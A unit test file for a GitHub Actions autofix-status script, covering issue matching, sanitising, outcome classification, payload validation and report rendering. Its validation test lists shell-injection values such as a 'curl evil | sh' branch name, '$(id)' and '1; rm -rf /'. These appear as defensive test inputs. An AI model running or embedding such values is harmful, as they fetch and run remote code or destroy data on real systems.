// Unit tests for autofix-status.mjs. Run: node --test .github/scripts/autofix-status.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
	sanitiseReason,
	issueMentionsPr,
	commitMentionsIssue,
	extractReason,
	partitionReviewIssues,
	validatePayload,
	parseUnfixedTsv,
	reasonFromComments,
	classifyOutcome,
	findUnaccounted,
	mergeManual,
	findOwnComment,
	renderQueueFooter,
	renderReport,
	REPORT_MARKER,
	REVIEW_MARKER,
	NO_REASON,
	MAX_REASON,
} from './autofix-status.mjs';

const issue = ( number, pr, { manual = false, reason = null } = {} ) => ( {
	number,
	body:
		`Found during review of PR #${ pr }\n\n**PR:** x\n` +
		( reason === null ? '' : `**Not auto-fixed:** ${ reason }\n` ) +
		'\n## Context',
	labels: [
		{ name: 'code-review' },
		...( manual ? [ { name: 'needs-manual-fix' } ] : [] ),
	],
} );

// ── matching ────────────────────────────────────────────────────────────────

test( 'PR #10 does not match issues for PR #1060 (and the reverse)', () => {
	assert.equal( issueMentionsPr( 'Found during review of PR #1060\n', 10 ), false );
	assert.equal( issueMentionsPr( 'Found during review of PR #10\n', 10 ), true );
	assert.equal( issueMentionsPr( 'Found during review of PR #10', 10 ), true );
	assert.equal( issueMentionsPr( 'Found during review of PR #10\n', 1060 ), false );
	assert.equal( issueMentionsPr( undefined, 10 ), false );
} );

test( 'partition only takes issues for the requested PR', () => {
	const p = partitionReviewIssues(
		[ issue( 5, 10 ), issue( 6, 1060 ), issue( 7, 10 ) ],
		10
	);
	assert.deepEqual( p.queued, [ 5, 7 ] );
	assert.equal( p.matched, 2 );
} );

test( 'issue #1 does not match commit messages for #10, and vice versa', () => {
	assert.equal( commitMentionsIssue( 'fix: x (closes #10)', 1 ), false );
	assert.equal( commitMentionsIssue( 'fix: x (closes #1)', 1 ), true );
	assert.equal( commitMentionsIssue( 'fix: x\n\ncloses #1', 1 ), true );
	assert.equal( commitMentionsIssue( 'fix: x (closes #1)', 10 ), false );
	assert.equal( commitMentionsIssue( 'fix: x #12, #1.', 1 ), true );
	assert.equal( commitMentionsIssue( 'fix: x', 1 ), false );
} );

// ── partition ───────────────────────────────────────────────────────────────

test( 'partition: empty input and empty lists', () => {
	assert.deepEqual( partitionReviewIssues( [], 3 ), {
		queued: [],
		manual: [],
		forced: [],
		matched: 0,
	} );
	assert.deepEqual( partitionReviewIssues( undefined, 3 ).queued, [] );
} );

test( 'partition: default is queue; only the label excludes', () => {
	const p = partitionReviewIssues(
		[
			issue( 3, 9 ),
			issue( 2, 9, { manual: true, reason: 'needs an API key (rule a)' } ),
			// Reason line without the label does not exclude.
			issue( 4, 9, { reason: 'looks big' } ),
		],
		9
	);
	assert.deepEqual( p.queued, [ 3, 4 ] );
	assert.deepEqual( p.manual, [ { number: 2, reason: 'needs an API key (rule a)' } ] );
} );

test( 'partition: manual label with a missing reason is still manual', () => {
	const p = partitionReviewIssues( [ issue( 2, 9, { manual: true } ) ], 9 );
	assert.deepEqual( p.manual, [ { number: 2, reason: NO_REASON } ] );
	const empty = partitionReviewIssues(
		[ issue( 2, 9, { manual: true, reason: '   ' } ) ],
		9
	);
	assert.equal( empty.manual[ 0 ].reason, NO_REASON );
} );

test( 'partition: "needs CI" / "human review" exclusions are force-queued and logged', () => {
	const p = partitionReviewIssues(
		[
			issue( 2, 9, { manual: true, reason: 'needs a real CI run to verify' } ),
			issue( 3, 9, { manual: true, reason: 'warrants human review' } ),
			issue( 4, 9, { manual: true, reason: 'needs the account ID (rule a)' } ),
		],
		9
	);
	assert.deepEqual( p.queued, [ 2, 3 ] );
	assert.deepEqual( p.forced.map( ( f ) => f.number ), [ 2, 3 ] );
	assert.deepEqual( p.manual.map( ( m ) => m.number ), [ 4 ] );
} );

test( 'partition: de-duplicates, ignores malformed entries, handles 300 issues', () => {
	const many = Array.from( { length: 300 }, ( _, i ) => issue( i + 1, 77 ) );
	const p = partitionReviewIssues(
		[ ...many, issue( 1, 77 ), { number: 'x', body: 'Found during review of PR #77' }, null ],
		77
	);
	assert.equal( p.queued.length, 300 );
} );

// ── sanitising ──────────────────────────────────────────────────────────────

test( 'sanitiseReason strips newlines, backticks, mentions, html and links', () => {
	const out = sanitiseReason( 'a\nb `rm -rf` @octocat <script>x</script> [l](http://e) | y\u0007' );
	assert.equal( /[\n`@<>[\]|\u0007]/.test( out ), false );
	assert.match( out, /^a b rm -rf octocat scriptx\/script l\(http:\/\/e\) y$/ );
} );

test( 'sanitiseReason caps length and falls back when empty', () => {
	const out = sanitiseReason( 'x'.repeat( 1000 ) );
	assert.equal( out.length, MAX_REASON );
	assert.ok( out.endsWith( '…' ) );
	assert.equal( sanitiseReason( '' ), NO_REASON );
	assert.equal( sanitiseReason( null ), NO_REASON );
	assert.equal( sanitiseReason( '`@`' ), NO_REASON );
} );

test( 'extractReason reads the marker line only', () => {
	assert.equal( extractReason( 'a\n**Not auto-fixed:** reason here\nb' ), 'reason here' );
	assert.equal( extractReason( 'a\r\n**Not auto-fixed:** crlf\r\n' ), 'crlf' );
	assert.equal( extractReason( 'no marker' ), null );
	assert.equal( extractReason( 'text **Not auto-fixed:** inline' ), null );
} );

// ── outcome ─────────────────────────────────────────────────────────────────

test( 'classifyOutcome: fixed needs closed AND matching commit AND pushed', () => {
	const o = classifyOutcome( {
		dispatched: [ 1, 2, 3, 4 ],
		issues: {
			1: { state: 'CLOSED' },
			2: { state: 'CLOSED' },
			3: { state: 'OPEN', reason: 'needs the variant ID' },
			4: { state: 'OPEN' },
		},
		commits: [ 'fix: a (closes #1)' ],
		pushed: true,
	} );
	assert.deepEqual( o.fixed, [ 1 ] );
	assert.deepEqual( o.closedNoCommit, [
		{ number: 2, note: 'closed, no matching pushed commit' },
	] );
	assert.deepEqual( o.notFixed, [
		{ number: 3, reason: 'needs the variant ID', hasCommit: false },
		{ number: 4, reason: NO_REASON, hasCommit: false },
	] );
} );

test( 'classifyOutcome: closed with a commit that is not pushed is not fixed', () => {
	const o = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'CLOSED' } },
		commits: [ 'fix: a (closes #1)' ],
		pushed: false,
	} );
	assert.deepEqual( o.fixed, [] );
	assert.match( o.closedNoCommit[ 0 ].note, /not pushed/ );
} );

test( 'classifyOutcome: #1 closed is not fixed by a commit for #10', () => {
	const o = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'CLOSED' } },
		commits: [ 'fix: a (closes #10)' ],
		pushed: true,
	} );
	assert.deepEqual( o.fixed, [] );
	assert.equal( o.closedNoCommit.length, 1 );
} );

test( 'classifyOutcome: open issue with a pushed fix commit is not labelled as unfixable', () => {
	const o = classifyOutcome( {
		dispatched: [ 1 ],
		issues: { 1: { state: 'OPEN' } },
		commits: [ 'fix: a (closes #1)' ],
		pushed: true,
	} );
	assert.equal( o.notFixed[ 0 ].hasCommit, true );
	assert.match( o.notFixed[ 0 ].reason, /not closed/ );
} );

test( 'classifyOutcome: empty and unknown issues', () => {
	assert.deepEqual( classifyOutcome( { dispatched: [], issues: {}, commits: [], pushed: false } ), {
		fixed: [],
		closedNoCommit: [],
		notFixed: [],
	} );
	const o = classifyOutcome( { dispatched: [ 9 ], issues: {}, commits: [], pushed: true } );
	assert.equal( o.notFixed[ 0 ].reason, NO_REASON );
} );

test( 'reasonFromComments uses the latest comment since the run start', () => {
	const comments = [
		{ body: 'old note', createdAt: '2026-01-01T00:00:00Z' },
		{ body: 'Needs the account ID\nmore', createdAt: '2026-01-02T10:05:00Z' },
		{ body: 'Later @someone `x`', createdAt: '2026-01-02T10:09:00Z' },
	];
	assert.equal( reasonFromComments( comments, '2026-01-02T10:00:00Z' ), 'Later someone x' );
	assert.equal( reasonFromComments( comments, '2026-02-01T00:00:00Z' ), null );
	assert.equal( reasonFromComments( [], '2026-02-01T00:00:00Z' ), null );
} );

test( 'parseUnfixedTsv parses number<TAB>reason lines', () => {
	assert.deepEqual( parseUnfixedTsv( '12\tneeds key\n#13\tother `x`\nbad line\n' ), {
		12: 'needs key',
		13: 'other x',
	} );
	assert.deepEqual( parseUnfixedTsv( '' ), {} );
} );

// ── accounting ──────────────────────────────────────────────────────────────

test( 'findUnaccounted lists open review issues in no list', () => {
	assert.deepEqual(
		findUnaccounted( [ 1, 2, 3, 4 ], [ 1 ], [ { number: 2, reason: 'r' } ] ),
		[ 3, 4 ]
	);
	assert.deepEqual( findUnaccounted( [], [], [] ), [] );
	assert.deepEqual( findUnaccounted( undefined, undefined, undefined ), [] );
} );

test( 'mergeManual de-duplicates and drops dispatched issues', () => {
	assert.deepEqual(
		mergeManual(
			[ { number: 5, reason: 'payload' } ],
			[ { number: 5, reason: 'live' }, { number: 3, reason: 'l3' }, { number: 9, reason: 'x' } ],
			[ 9 ]
		),
		[ { number: 3, reason: 'l3' }, { number: 5, reason: 'payload' } ]
	);
} );

test( 'findOwnComment requires marker AND the bot author (anti-spoof)', () => {
	const comments = [
		{ id: 1, body: `${ REPORT_MARKER } spoof`, user: { login: 'mallory' } },
		{ id: 2, body: 'no marker', user: { login: 'github-actions[bot]' } },
		{ id: 3, body: `${ REPORT_MARKER } real`, user: { login: 'github-actions[bot]' } },
	];
	assert.equal( findOwnComment( comments, REPORT_MARKER ), 3 );
	assert.equal( findOwnComment( comments.slice( 0, 2 ), REPORT_MARKER ), null );
	assert.equal( findOwnComment( [], REPORT_MARKER ), null );
} );

// ── validation ──────────────────────────────────────────────────────────────

const goodPayload = () => ( {
	pr_number: 12,
	head_branch: 'claude/feat-x_1.2',
	base_branch: 'main',
	issue_numbers: [ 3, 1, 3 ],
	manual_issues: [ { number: 7, reason: 'a\n@x `y`' } ],
} );

test( 'validatePayload accepts a good payload and normalises it', () => {
	const r = validatePayload( goodPayload() );
	assert.equal( r.ok, true );
	assert.deepEqual( r.value.issues, [ 1, 3 ] );
	assert.deepEqual( r.value.manual, [ { number: 7, reason: 'a x y' } ] );
	assert.equal( r.value.prNumber, 12 );
} );

test( 'validatePayload accepts a missing manual_issues and empty issue_numbers', () => {
	const p = goodPayload();
	delete p.manual_issues;
	p.issue_numbers = [];
	assert.equal( validatePayload( p ).ok, true );
	delete p.issue_numbers;
	assert.deepEqual( validatePayload( p ).value.issues, [] );
} );

test( 'validatePayload rejects injection attempts', () => {
	for ( const bad of [
		{ pr_number: '1; rm -rf /' },
		{ pr_number: '01' },
		{ pr_number: -1 },
		{ head_branch: 'a"; curl evil | sh; "' },
		{ head_branch: '$(id)' },
		{ head_branch: '-delete' },
		{ head_branch: 'a..b' },
		{ head_branch: 'a b' },
		{ base_branch: 'x\ny' },
		{ issue_numbers: '1,2' },
		{ issue_numbers: [ 1, '2' ] },
		{ issue_numbers: [ 1.5 ] },
		{ issue_numbers: [ '1 && id' ] },
		{ manual_issues: [ { number: 'x', reason: 'r' } ] },
		{ manual_issues: 'x' },
	] ) {
		assert.equal( validatePayload( { ...goodPayload(), ...bad } ).ok, false, JSON.stringify( bad ) );
	}
	assert.equal( validatePayload( null ).ok, false );
} );

// ── rendering ───────────────────────────────────────────────────────────────

test( 'renderQueueFooter lists queued and manual with the marker', () => {
	const md = renderQueueFooter( {
		queued: [ 4 ],
		manual: [ { number: 5, reason: 'needs key' } ],
	} );
	assert.ok( md.startsWith( REVIEW_MARKER ) );
	assert.match( md, /- #4/ );
	assert.match( md, /- #5: needs key/ );
	assert.match( renderQueueFooter( { queued: [], manual: [] } ), /- none/ );
} );

test( 'renderReport scenario: 1 fixed, 1 manual-not-queued, 1 open-unfixed', () => {
	const outcome = classifyOutcome( {
		dispatched: [ 10, 11 ],
		issues: {
			10: { state: 'CLOSED' },
			11: { state: 'OPEN', reason: 'needs the variant ID' },
		},
		commits: [ 'fix: x (closes #10)' ],
		pushed: true,
	} );
	const md = renderReport( {
		...outcome,
		notQueued: [ { number: 12, reason: 'needs an API key (rule a)' } ],
		unaccounted: [],
		runUrl: 'https://github.com/o/r/actions/runs/1',
	} );
	assert.ok( md.startsWith( REPORT_MARKER ) );
	assert.match( md, /Fixed 1 · Not fixed 1 · Not queued by review 1/ );
	assert.match( md, /\*\*Fixed \(1\)\*\*\n- #10\n/ );
	assert.match( md, /\*\*Not fixed \(1\)\*\*\n- #11: needs the variant ID\n/ );
	assert.match( md, /\*\*Not queued by review \(1\)\*\*\n- #12: needs an API key \(rule a\)\n/ );
	assert.doesNotMatch( md, /not accounted for/ );
	assert.doesNotMatch( md, /Skipped: none/ );
} );

test( 'renderReport with empty lists says none, and shows unaccounted and closed-no-commit', () => {
	const empty = renderReport( {
		fixed: [],
		closedNoCommit: [],
		notFixed: [],
		notQueued: [],
		unaccounted: [],
	} );
	assert.equal( ( empty.match( /- none/g ) || [] ).length, 3 );
	const full = renderReport( {
		fixed: [],
		closedNoCommit: [ { number: 2, note: 'closed, no matching pushed commit' } ],
		notFixed: [],
		notQueued: [],
		unaccounted: [ 8, 9 ],
		sessionOutcome: 'failure',
	} );
	assert.match( full, /Open review issues not accounted for \(2\)\*\*\n- #8\n- #9/ );
	assert.match( full, /Closed, no matching pushed commit \(1\)/ );
	assert.match( full, /session ended with status `failure`/ );
} );
